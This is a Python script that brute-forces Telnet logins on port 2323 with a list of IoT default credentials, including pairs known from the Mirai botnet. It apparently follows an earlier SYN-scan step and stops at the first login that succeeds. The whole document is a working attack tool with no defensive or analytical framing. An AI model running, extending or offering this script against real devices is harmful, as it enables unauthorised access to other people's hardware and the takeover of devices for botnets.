import telnetlib
import time

# Assuming 'target_device' is obtained from your previous TCP SYN scan
target_device = '127.0.0.1'
port = 2323  # Default Telnet port

# Credentials list as before
credentials = [
    ("root", "xc3511"),
    ("root", "vizxv"),
    # Add all other credentials here
    ("tech", "tech"),
    ("admin", "admin"),
    # Handle the no password case as needed
]

for username, password in credentials:
    try:
        print(f"Trying {username}:{password}")

        # Establish a Telnet connection
        tn = telnetlib.Telnet(target_device, port, timeout=10)
        
        # Read until a login prompt is found (customize as needed)
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")

        # Assuming a password will be prompted next; adjust if your target system behaves differently
        if password:
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")

        # Wait for a command prompt or other successful login indicator
        # This part is highly specific to the target system and may need adjustment
        index, match, text = tn.expect([b"Last login", b"\$ ", b"# "], timeout=5)
        if index != -1:
            print(f"Success: {username}:{password}")
            tn.close()
            break  # Exit after the first successful login
        else:
            print(f"Failed: {username}:{password}")
        tn.close()
    except Exception as e:
        print(f"Connection failed for {username}:{password} with error {e}")
    finally:
        time.sleep(1)  # Be polite and don't overwhelm the network/device


